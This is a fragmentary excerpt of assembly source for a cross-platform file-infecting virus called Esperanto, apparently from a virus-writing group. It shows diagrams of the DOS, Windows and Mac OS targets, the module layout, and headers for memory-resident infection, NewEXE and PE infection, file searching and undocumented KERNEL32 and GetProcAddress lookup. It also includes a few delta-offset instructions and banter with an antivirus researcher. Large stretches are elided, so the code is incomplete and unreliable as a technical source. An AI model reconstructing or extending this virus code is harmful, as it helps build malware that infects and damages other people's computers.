...
;
;
;                   ┌─────────────┐   ┌─  DOS ──────  COM, EXE, NewEXE, PE
;        ┌───────── │ Intel 80x86 ├───┼─  Win 3.1x ─  COM, EXE, NewEXE, PE
;        │          │    (PCs)    │   └─  Win32 ────  COM, EXE, PE
;        │          └─────────────┘
;        │         ┌────────────────┐
;  ┌─────┴─────┐   │ Motorola 680x0 │
;  │ Esperanto ├── │   (Old Macs)   ├─┐            ┌─  Mac OS Apps
;  └─────┬─────┘   │ (Mac Performa) │ │            ├─  System File
;        │         └────────────────┘ ├─  Mac OS ──┼─  Mac OS Finder
;        │          ┌──────────────┐  │            ├─  DA Handler
;        │          │ PowerPC 6xx  │  │            └─  Desktop File
;        └───────── │ (Power Macs) ├──┘                (Mac OS <7)
;                   │ (PowerBooks) │
;                   └──────────────┘
;
...
;        │ │      │░░ Win module ░░│
;        │ │      │░░░░░░░░░░░░░░░░│
;        │ └───── │▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒├──  DOS memory resident code
;        └─────── │▒▒ DOS module ▒▒├──  16-bit infection routines
;                 │▒▒(memory res)▒▒│
;                 │▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒│
;                 │▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓├──  PE entry point
;                 │▓▓ W32 module ▓▓│
...
; its code into it and then jumps to this copy, so no δelta-offset is longer
...
;
;
; 4.1. Mikko Hyppönen speaks (F-Prot)
; ───────────────────────────────────
...
; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
;
; My reply: lo tuyo sí que se sale... ;) Espero verte de nuevo en la próxima
; reunión de 29A este verano, a ver si esta vez no te pierdes en Madrid ;)
;
...
; ──┤ Entry point for Mac OS applications ├──────────────────────────────────
...
espo_body:      link    a6,#-$24                    ; Link code address
                ...
                move.l  $14(a6),d5                  ; Use d5 as δelta-offset
...
new_mdef:       movea.l d5,a0                       ; Move δelta to a0
...
real_ce_entry:  call    delta_offset                ; Get δ-offset in BP in
...
; ──┤ NewEXE files infection routine ├───────────────────────────────────────
...
; ──┤ Look for the RVA of a given API by name ├──────────────────────────────
;
;   Entry:
;     ■ EDX    => Section δelta-offset
...
; ──┤ Check system conditions before infection ├─────────────────────────────
;
;   Entry:
...
; ──┤ File searching routine (FindFirstFileA-based) ├────────────────────────
...
; ──┤ File searching routine (FindNextFileA-based) ├─────────────────────────
...
; ──┤ Undocumented way to find the address of K32 ├──────────────────────────
;
;   Entry:
...
; ──┤ Undocumented way to find the address of GetProcAddress ├───────────────
;
;   Entry:
;     ■ EBX        => base address of host
...
; ══╣ Data area for the Intel modules ╠══════════════════════════════════════
